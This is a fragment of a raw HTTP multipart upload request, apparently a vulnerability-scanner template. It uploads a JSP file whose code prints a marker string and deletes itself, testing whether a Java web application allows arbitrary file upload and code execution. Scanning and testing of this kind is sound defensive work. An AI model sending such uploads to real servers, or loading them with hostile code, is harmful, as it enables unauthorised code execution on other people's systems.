        Accept: */*
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Cookie: JSESSIONID=D608C8AF5AC63FB5DA57B858CFC42B42
        Connection: close
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryGIc4ig8R
        Content-Length: 184

        ------WebKitFormBoundaryGIc4ig8R
        Content-Disposition: form-data; name="aaa"; filename="{{filename}}.jsp"
        Content-Type: application/octet-stream

        <% out.println("whoisceshi");new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
